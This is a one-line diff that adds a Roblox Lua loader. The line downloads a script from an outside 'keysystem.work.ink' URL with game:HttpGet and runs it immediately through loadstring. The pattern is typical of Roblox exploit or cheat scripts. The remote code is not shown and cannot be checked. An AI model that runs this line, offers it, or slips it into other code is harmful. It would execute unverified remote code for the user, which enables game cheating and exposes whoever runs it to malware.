@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://keysystem.work.ink/scripts/019fa966-8eac-744e-8fbf-754ac4a6417f"))()
